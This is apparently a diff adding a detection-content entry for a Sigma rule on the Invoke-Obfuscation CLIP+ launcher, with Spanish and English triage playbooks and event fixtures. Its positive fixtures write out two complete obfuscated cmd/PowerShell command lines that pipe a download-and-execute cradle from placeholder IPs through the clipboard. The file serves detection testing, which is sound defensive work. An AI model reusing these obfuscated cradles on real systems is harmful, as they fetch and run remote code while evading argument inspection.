@@ -1,0 +1,120 @@
+{
+  "rule": {
+    "id": "b222df08-0e07-11eb-adc1-0242ac120002",
+    "title": "Invoke-Obfuscation CLIP+ Launcher",
+    "level": "high",
+    "status": "test",
+    "author": "Jonathan Cheong, oscd.community",
+    "path": "windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_clip.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_clip.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó un cmd.exe cuya línea de comandos coincide con el launcher CLIP+ de Invoke-Obfuscation: el payload se copia al portapapeles con clip y PowerShell lo lee y lo ejecuta mediante [Clipboard]:: con cadenas armadas con -f.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene 'cmd', '/c' o '/r', '&&', 'clipboard]::' y el operador de formato '-f'. Así se ve el launcher CLIP+ de Invoke-Obfuscation, que pasa el código a PowerShell por el portapapeles en lugar de ponerlo en sus argumentos.",
+      "why_it_matters": "Esta técnica oculta el comando real de PowerShell (T1059.001) frente a las herramientas que revisan argumentos y lo ofusca con concatenación y formato de cadenas (T1027). Es un uso típico de malware, droppers y operadores que descargan y ejecutan código en memoria.",
+      "triage_steps": [
+        "Revise el CommandLine completo. Identifique el texto que se envía con echo a clip, porque ese es el payload real (por ejemplo, DownloadString con una URL).",
+        "Reconstruya las cadenas '{0}{1}' -f para ver qué métodos se invocan (GetText, Invoke-Expression, SetText) y confirmar que se ejecuta lo que hay en el portapapeles.",
+        "Revise el ParentImage de cmd.exe. Un padre como Office, wscript, mshta, un navegador o explorer.exe (diálogo Ejecutar) apunta a phishing o a ingeniería social.",
+        "Busque los procesos hijos powershell.exe y su CommandLine. Si está habilitado, revise también el Script Block Logging (evento 4104) en el mismo host, entre 15 minutos antes y 15 después.",
+        "Correlacione en esa misma ventana las conexiones de red y consultas DNS del host. Busque descargas desde las URL o IP extraídas del payload.",
+        "Revise la persistencia creada después de la ejecución: claves Run, tareas programadas, servicios y archivos nuevos en %TEMP% o %APPDATA%.",
+        "Busque el mismo patrón de CommandLine, el mismo usuario y los mismos indicadores en otros endpoints. Revise también alertas anteriores de esta entidad."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos. El uso legítimo de este patrón es muy raro.",
+        "Ejercicios de red team, pruebas de detección o laboratorios que usan Invoke-Obfuscation con autorización. Confírmelos con el equipo responsable."
+      ],
+      "response_steps": [
+        "Confirme la ejecución maliciosa a partir del payload decodificado, la actividad de red y el proceso padre antes de tomar acciones.",
+        "Si se confirma, aísle el endpoint desde el EDR y preserve la memoria, los registros de PowerShell y los artefactos descargados.",
+        "Bloquee las URL, dominios, IP y hashes identificados. Restablezca las credenciales del usuario si pudieron quedar expuestas.",
+        "Elimine la persistencia y los archivos maliciosos ya verificados. Luego restaure el equipo y vigílelo con más atención durante algunos días."
+      ],
+      "severity_rationale": "El nivel high se justifica porque esta combinación de cmd, clip, [Clipboard]:: y formato -f es propia de la ofuscación deliberada y casi nunca aparece en la administración legítima."
+    },
+    "en": {
+      "summary": "A cmd.exe command line matched the Invoke-Obfuscation CLIP+ launcher. The payload is piped to clip, then PowerShell reads and runs it through [Clipboard]:: calls built with -f format strings.",
+      "what_it_detects": "Process creation events whose CommandLine contains 'cmd', '/c' or '/r', '&&', 'clipboard]::' and the '-f' format operator. This is how the Invoke-Obfuscation CLIP+ launcher looks: it passes code to PowerShell through the clipboard instead of its arguments.",
+      "why_it_matters": "It hides the real PowerShell command (T1059.001) from tools that inspect arguments and obfuscates it with string formatting (T1027). Malware, droppers and operators commonly use it for download-and-execute in memory.",
+      "triage_steps": [
+        "Read the full CommandLine. Find the text echoed into clip, because that is the real payload (for example, DownloadString with a URL).",
+        "Rebuild the '{0}{1}' -f strings to see which methods are called (GetText, Invoke-Expression, SetText) and confirm that the clipboard content gets executed.",
+        "Check the ParentImage of cmd.exe. A parent such as Office, wscript, mshta, a browser or explorer.exe (Run dialog) points to phishing or social engineering.",
+        "Find the powershell.exe child processes and their CommandLine. If enabled, also check Script Block Logging (event 4104) on the same host, from 15 minutes before to 15 minutes after.",
+        "In the same window, correlate the host's network connections and DNS queries. Look for downloads from URLs or IPs extracted from the payload.",
+        "Look for persistence created after execution: Run keys, scheduled tasks, services and new files in %TEMP% or %APPDATA%.",
+        "Search other endpoints for the same CommandLine pattern, the same user and the same indicators. Also review earlier alerts for this entity."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives. Legitimate use of this pattern is very rare.",
+        "Authorized red team exercises, detection tests or labs that run Invoke-Obfuscation. Confirm with the team responsible."
+      ],
+      "response_steps": [
+        "Confirm malicious execution from the decoded payload, network activity and parent process before taking action.",
+        "If confirmed, isolate the endpoint through EDR and preserve memory, PowerShell logs and downloaded artifacts.",
+        "Block the identified URLs, domains, IPs and hashes. Reset the user's credentials if they may have been exposed.",
+        "Remove the persistence and malicious files you have verified. Then restore the host and watch it more closely for a few days."
+      ],
+      "severity_rationale": "High fits because this combination of cmd, clip, [Clipboard]:: and -f formatting is typical of deliberate obfuscation and almost never appears in legitimate administration."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "CLIP+ launcher with /c: the download cradle is piped to clip, and PowerShell reads it through an obfuscated Windows.Forms.Clipboard GetText call.",
+        "event": {
+          "EventID": 1,
+          "UtcTime": "2024-05-14 09:21:37.412",
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "Cmd /c\" echo/Invoke-Expression (New-Object Net.WebClient).DownloadString('http://203.0.113.15/a.ps1') |cLiP&& POWerSheLl -Nolog -sT . (\"{1}{2}{0}\"-f'pe','Ad','d-Ty') -Assemb System.Windows.Forms ; ([SySTEM.wiNDows.FoRmS.CLiPbOArd]::( \"{1}{0}\" -f 'TTeXT','gE' ).\"invO`Ke\"( ) ) ^| ^&( \"{0}{1}\" -f 'iNV','oKE-ExPRESS' )\""
+        }
+      },
+      {
+        "description": "CLIP+ variant using cmd /r, the full path to clip and System.Windows.Clipboard.",
+        "event": {
+          "EventID": 1,
+          "UtcTime": "2024-05-14 11:02:05.090",
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "CMD/r \" ECho Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.23/s')|c:\\WiNDowS\\SySteM32\\cLip && powershElL -noPRO -sTa ^& (\"{0}{1}\" -f 'Add-','Type') -AssemblyN PresentationCore ; ^& ( 'iex' ) ( ( [sySTem.WInDOWs.ClipbOaRD]::( \"{1}{0}\" -f 'tText','ge' ).\"IN`Vo`Ke\"( ) ) )\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin one-liner that copies the hostname to the clipboard and reads it back with Get-Clipboard. It has no [Clipboard]:: call and no -f format operator.",
+        "event": {
+          "EventID": 1,
+          "UtcTime": "2024-05-14 10:15:44.201",
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\soporte01",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "cmd.exe /c echo %COMPUTERNAME% | clip && powershell -NoProfile -Command Get-Clipboard"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
